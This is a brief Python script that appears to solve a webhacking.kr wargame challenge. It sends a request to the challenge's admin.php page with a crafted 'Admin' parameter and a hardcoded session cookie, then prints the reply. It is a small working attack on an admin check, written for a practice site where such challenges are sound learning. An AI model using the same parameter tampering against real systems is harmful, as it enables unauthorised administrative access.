import requests


url = "http://webhacking.kr/challenge/bonus/bonus-9/admin.php"

params = {
	"Admin": "211.187.167.36:admin"
}

headers = {
	"Cookie":"PHPSESSID=b2f4afe01ffbb827e31f86bff992b61d",
	"Host":"webhacking.kr"
}

req = requests.get(url, params=params, headers=headers)
print req.content